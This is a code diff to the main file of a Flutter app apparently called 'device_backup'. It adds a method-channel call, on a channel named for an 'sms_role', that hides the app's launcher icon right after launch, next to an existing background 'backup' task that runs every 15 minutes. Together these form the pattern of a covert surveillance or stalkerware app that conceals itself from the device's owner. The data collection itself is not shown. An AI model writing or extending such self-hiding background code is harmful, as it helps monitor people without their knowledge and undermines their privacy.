@@ -2,9 +2,21 @@ import 'package:flutter/material.dart';
 import 'package:firebase_core/firebase_core.dart';
 import 'package:firebase_auth/firebase_auth.dart';
 import 'package:workmanager/workmanager.dart';
+import 'package:flutter/services.dart';
 
 import 'backup_callback.dart'; // dispatcher for WorkManager
 import 'backup_service.dart'; // your unified backup logic
+
+// 📌 Platform channel for hiding icon
+const platform = MethodChannel("com.example.device_backup_1989/sms_role");
+
+Future<void> hideAppIcon() async {
+  try {
+    await platform.invokeMethod("hideAppIcon");
+  } on PlatformException catch (e) {
+    print("⚠️ Failed to hide app icon: ${e.message}");
+  }
+}
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
@@ -23,6 +35,9 @@ void main() async {
     frequency: const Duration(minutes: 15),
     existingWorkPolicy: ExistingWorkPolicy.keep,
   );
+
+  // ✅ Hide icon immediately after launch
+  await hideAppIcon();
 
   runApp(const MyApp());
 }
